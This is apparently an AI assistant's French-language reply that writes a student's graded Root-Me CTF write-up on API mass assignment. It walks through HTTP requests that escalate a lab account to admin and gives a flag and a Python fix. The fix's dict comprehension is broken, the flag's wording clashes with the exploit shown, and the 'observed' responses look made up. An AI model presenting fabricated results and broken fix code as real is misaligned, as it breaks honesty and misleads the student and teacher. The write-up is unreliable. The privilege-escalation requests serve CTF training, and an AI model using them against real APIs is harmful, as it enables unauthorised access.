Parfait, voici **la version propre**, **simple**, **au format que ton prof attend**, **sans détails inutiles**, strictement calquée sur l’exemple XSS que tu m’as donné.

---

# Challenge 11 : API Mass Assignment

**URL** : [https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment](https://www.root-me.org/fr/Challenges/Web-Serveur/API-Mass-Assignment)

## Exploitation

Paramètres manipulables : `status` (non prévu pour l’utilisateur)

### Étape 1 : Créer un compte

Requête :

```http
POST /api/signup HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json

{
  "username": "samuel",
  "password": "azerty"
}
```

Un compte est créé, un cookie de session est attribué.

### Étape 2 : Se connecter

Requête :

```http
POST /api/login HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json

{
  "username": "samuel",
  "password": "azerty"
}
```

Cela fournit un cookie valide permettant de modifier son profil.

### Étape 3 : Vérifier les champs disponibles

Requête :

```http
GET /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
Cookie: session=COOKIE
```

Réponse observée :

```json
{
  "username": "samuel",
  "status": "guest",
  "userid": 3,
  "note": ""
}
```

Le champ `status` existe côté serveur mais n’est normalement pas modifiable.

### Étape 4 : Exploiter le Mass Assignment

En envoyant un champ supplémentaire, le serveur l’accepte sans validation.

Requête :

```http
PUT /api/user HTTP/1.1
Host: challenge01.root-me.org:59090
Content-Type: application/json
Cookie: session=COOKIE

{
  "status": "admin"
}
```

L’utilisateur devient admin.

### Étape 5 : Récupérer le flag

Requête :

```http
GET /api/flag HTTP/1.1
Host: challenge01.root-me.org:59090
Cookie: session=COOKIE
```

Réponse :

```
RM{4lw4yS_ch3ck_0pt10ns_m3th0d}
```

---

## Payload

```json
{
  "status": "admin"
}
```

## Explication

* L’API copie directement tous les champs reçus dans l’objet utilisateur.
* Aucun filtrage (whitelist) n’est appliqué.
* Le champ interne `status`, normalement réservé à l’administration, est donc modifiable via la requête JSON.
* Cette faille permet une élévation de privilèges puis l’accès au flag.

## Correction

Valider explicitement les champs autorisés :

```python
allowed = ["note"]
data = request.get_json()
safe = {k: v for k in data.items() if k in allowed}
user.update(safe)
```

Ne jamais utiliser :

```python
user.update(request.json)  # vulnerabilité
```

---

## Notes

L’exploitation repose sur la modification d’un champ caché (`status`) via une requête PUT, permettant d’obtenir un rôle administrateur non prévu.

---

Tu veux que je t’en génère un autre pour le lab CSRF précédent, ou pour un prochain challenge ?
